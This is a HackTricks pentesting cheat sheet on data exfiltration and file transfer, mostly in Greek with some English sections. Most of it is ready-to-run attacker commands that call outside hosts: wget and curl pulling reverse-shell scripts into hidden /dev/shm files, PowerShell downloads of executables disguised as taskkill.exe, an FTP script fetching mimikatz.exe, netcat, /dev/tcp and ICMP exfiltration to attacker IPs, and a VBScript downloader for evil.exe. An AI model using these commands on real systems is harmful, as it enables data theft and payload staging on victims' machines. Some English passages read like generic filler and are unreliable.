# Εξιχνίαση

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Συνήθως εγκριμένοι τομείς για την εξιχνίαση πληροφοριών

Ελέγξτε το [https://lots-project.com/](https://lots-project.com/) για να βρείτε συνήθως εγκριμένους τομείς που μπορούν να καταχραστούν

## Αντιγραφή & Επικόλληση Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Παράθυρα**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Μεταφόρτωση αρχείων

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python module [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Διακομιστής HTTPS**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Διακομιστής FTP (python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP server (NodeJS)
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP server (pure-ftp)
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Πελάτης Windows**
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Κάλι ως διακομιστής
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Ή δημιουργήστε ένα smb share **χρησιμοποιώντας το samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
### Exfiltration

#### Techniques

- **Data Compression**: Compress data before exfiltration to reduce size and avoid detection.
- **Data Encryption**: Encrypt data before exfiltration to protect it from unauthorized access.
- **Data Fragmentation**: Break data into smaller fragments for exfiltration to evade detection.
- **Data Hiding**: Hide exfiltrated data within other files or protocols to avoid detection.
- **Steganography**: Conceal data within images, audio files, or other media to exfiltrate without detection.
- **Traffic Manipulation**: Manipulate network traffic to disguise exfiltration as normal traffic.
- **DNS Tunneling**: Use DNS protocol to exfiltrate data by encoding it within DNS queries and responses.
- **Exfiltration Over Alternative Protocols**: Use non-standard protocols for exfiltration to bypass detection mechanisms.
- **Exfiltration Over Encrypted Channels**: Use encrypted channels for exfiltration to avoid detection by network monitoring tools.

#### Tools

- **Netcat**: A versatile networking utility that can be used for exfiltration.
- **Curl**: A command-line tool for transferring data with URL syntax that can be used for exfiltration.
- **Wget**: A command-line utility for downloading files from the web that can be used for exfiltration.
- **FTP**: File Transfer Protocol can be used for exfiltration of data.
- **SCP**: Secure Copy Protocol can securely transfer files for exfiltration.
- **SFTP**: Secure File Transfer Protocol can be used for secure exfiltration of files.
- **HTTP/HTTPS**: Hypertext Transfer Protocol can be used for exfiltration over the web.
- **DNSCat2**: A tool for exfiltration using DNS protocol.
- **Iodine**: A tool for tunneling IP over DNS for exfiltration.
- **Dnscat2**: Another tool for exfiltration using DNS protocol.
- **PowerShell Empire**: A post-exploitation agent that can be used for exfiltration.
- **Mimikatz**: A tool for extracting credentials from Windows machines that can aid in exfiltration.
- **PsExec**: A command-line tool that can be used for executing processes on remote systems for exfiltration.
- **Bitsadmin**: A command-line tool to create and monitor BITS jobs for exfiltration.
- **Certutil**: A command-line program that can be used to dump and display certification authority (CA) configuration information.
- **WMIC**: Windows Management Instrumentation Command-line can be used for exfiltration.
- **PowerShell**: The Windows PowerShell can be used for various exfiltration techniques.
- **Windows Management Instrumentation (WMI)**: WMI can be used for exfiltration of data from Windows systems.
- **Windows Remote Management (WinRM)**: WinRM can be used for remote management and exfiltration on Windows systems.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

Ο επιτιθέμενος πρέπει να έχει ενεργοποιημένο το SSHd.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Αν το θύμα έχει SSH, ο επιτιθέμενος μπορεί να προσαρτήσει έναν κατάλογο από το θύμα στον επιτιθέμενο.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## Εξωτερική μεταφορά (Exfiltration)
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Λήψη αρχείου από το θύμα
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Μεταφόρτωση αρχείου στο θύμα
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
Ευχαριστίες στον **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Εάν μπορείτε να στείλετε δεδομένα σε έναν διακομιστή SMTP, μπορείτε να δημιουργήσετε έναν SMTP για να λάβετε τα δεδομένα με τη χρήση της Python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Από προεπιλογή σε XP και 2003 (σε άλλα πρέπει να προστεθεί ρητά κατά την εγκατάσταση)

Στο Kali, **ξεκινήστε τον διακομιστή TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Διακομιστής TFTP σε Python:**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
Στο **θύμα**, συνδεθείτε στον διακομιστή Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Λήψη ενός αρχείου με ένα PHP oneliner:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

### Overview

VBScript is a scripting language that is commonly used for Windows systems. It can be used for various purposes, including exfiltrating data from a compromised system. VBScript can be executed using the Windows Script Host (WSH) and can interact with the Windows operating system to perform tasks such as file operations, network communication, and data exfiltration.

### Exfiltration Techniques

#### File Transfer

VBScript can be used to transfer files from a compromised system to an external server using protocols such as FTP or HTTP. By reading the contents of a file and sending it over the network, an attacker can exfiltrate sensitive data without being detected.

#### Data Encoding

To avoid detection by security controls, data exfiltrated using VBScript can be encoded using techniques such as Base64 encoding. This allows the data to be obfuscated during transit and decoded on the attacker's server.

#### Network Communication

VBScript can establish network connections to send data to remote servers controlled by an attacker. By leveraging network sockets, VBScript can communicate over TCP or UDP to exfiltrate data stealthily.

### Detection and Prevention

Detecting VBScript-based exfiltration can be challenging due to its ability to blend in with legitimate scripting activities. Monitoring for suspicious network connections, file transfers, and unusual data encoding patterns can help in detecting potential exfiltration attempts. Restricting the use of VBScript and implementing application whitelisting can help prevent unauthorized scripts from running on Windows systems.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Θύμα**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση των δυαδικών αρχείων, αλλά έχει επίσης τη **δυνατότητα να τα ξαναχτίσει από hex**. Αυτό σημαίνει ότι παρέχοντας ένα hex ενός δυαδικού αρχείου, το `debug.exe` μπορεί να δημιουργήσει το δυαδικό αρχείο. Ωστόσο, είναι σημαντικό να σημειωθεί ότι το debug.exe έχει μια **περιορισμένη δυνατότητα συναρμολόγησης αρχείων μέχρι 64 kb σε μέγεθος**.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
